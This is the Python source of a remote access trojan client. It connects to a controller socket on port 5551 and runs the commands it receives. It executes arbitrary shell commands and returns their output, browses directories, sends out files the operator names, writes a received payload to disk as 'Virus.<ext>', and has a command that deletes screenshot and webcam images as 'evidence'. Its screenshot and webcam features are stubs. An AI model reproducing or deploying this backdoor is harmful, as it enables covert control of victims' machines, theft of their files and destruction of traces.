import socket
import os
import time
import subprocess

#connect Function
def connect():
	global s
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	port=5551
	host=socket.gethostname()
	s.connect((host,port))
#recv and send function	
conn=0
def prompt():
	while conn != 1:
		data=s.recv(1000)
		data=data.decode()
		if data=='ls':
			files()
		if data=='cmd':
			cmd()
		if data=='chmod -sc':
			screenshot()
		if data=='new -dir':
			chdir()
		if data== 'mode -sh':
			Upload_install()
		if data=='stop':
			quit()
		if data =='down':
			Send_Files()
		if data=='chmod -cam':
			webcam()
		if data=="down -img":
			download_images()
		if data.startswith('pwd'):
			pwd()
		if data.startswith('wipe -evidence'):
			wipe_evidence()
#get path workstation diractory
def pwd():
	path=os.getcwd()
	s.sendall(path.encode())


#send The output of command /CMD or for Terminal
def cmd():
	comm=s.recv(10000)
	comm=comm.decode('utf-8')
	DATA=subprocess.Popen(comm,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
	DATA_READ=str(DATA.stdout.read()+DATA.stderr.read())
	s.sendall(DATA_READ.encode())


#send The list files
def files():
	files=str(os.listdir())
	s.send(files.encode())
#for change The diractory
def chdir():
	#get The dir currect
	current_dir=os.getcwd()
	s.send(current_dir.encode())
	#recv The new dir 
	new_dir=s.recv(10000).decode()
	#change The diractory
	os.chdir(new_dir)
#recv The upload from sever and tersform it as bat
def Upload_install():
	#recv The extention 
	extention=s.recv(100).decode()
	#
	virus=s.recv(483386).decode()
	#
	full='Virus.'+extention
	with open(full,'w') as z:
		z.write(virus)
		z.close()



def Send_Files():
	target_File=s.recv(1909).decode()
	with open(target_File,'r') as F:
		Target=F.read()
		while Target != '':
			s.sendall(Target.encode())
			break

def download_images():
	print("sorry This One is locked ! ")



#open The webcam using OpenCv -Python
def webcam():
	print("Locked !")


#take screenshot 
def screenshot():
	print("locked")

def wipe_evidence():
	try:
		IM='screenshot.png'
		WB='camera.png'
		os.remove(IM)
		os.remove(WB)
	except:
		pass




#exit from the program
def quit():
	s.close()
	exit()


#main function
def main():
	connect()
	prompt()

if __name__=="__main__":
	main()
